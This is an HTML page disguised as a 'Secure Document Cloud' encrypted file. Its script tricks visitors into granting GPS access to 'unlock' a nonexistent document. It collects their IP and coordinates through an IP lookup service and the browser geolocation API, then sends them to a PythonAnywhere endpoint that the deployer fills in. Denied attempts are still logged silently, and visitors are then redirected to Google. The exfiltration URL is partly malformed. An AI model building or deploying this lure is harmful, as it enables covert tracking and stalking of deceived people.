html
<!DOCTYPE html>
<html>
<head>
    <title>Secure Document Cloud</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 20%; background: #f4f7f6; }
        .card { background: white; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 85%; }
        .btn { background: #28a745; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card" id="box">
        <h2>🔒 Encrypted Document</h2>
        <p>This file is restricted to the authorized region. Click below to verify your location and unlock.</p>
        <button class="btn" onclick="start()">UNLOCK FILE</button>
    </div>

    <script>
        let info = { ip: "...", lat: "0", lon: "0", type: "IP-Only" };

        // 1. Get IP Backup
        fetch('https://ipapi.co').then(r => r.json()).then(d => {
            info.ip = d.ip; info.lat = d.latitude; info.lon = d.longitude;
        });

        function start() {
            document.getElementById('box').innerHTML = "<h3>Verifying...</h3>";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, fail, {enableHighAccuracy:true});
            }
        }

        function success(p) {
            info.lat = p.coords.latitude; 
            info.lon = p.coords.longitude; 
            info.type = "EXACT-GPS";
            send();
        }

        function fail() {
            // STRICT MODE: No image if they click Deny
            document.getElementById('box').innerHTML = \`
                <h2 style="color:red;">Access Denied</h2>
                <p>Location permission is mandatory to decrypt this file.</p>
                <button class="btn" onclick="location.reload()">RETRY UNLOCK</button>\`;
            
            // Still log the attempt silently
            info.type = "DENIED-ACCESS";
            send(false); 
        }

        function send(shouldRedirect = true) {
            // !!! REPLACE 'YOURNAME' WITH YOUR PYTHONANYWHERE USERNAME !!!
            const url = \`https://pythonanywhere.com{info.lat}&lon=${info.lon}&ip=${info.ip}&type=${info.type}\`;
            fetch(url).then(() => {
                if(shouldRedirect) window.location.href = "https://google.com";
            });
        }
    </script>
</body>
</html>
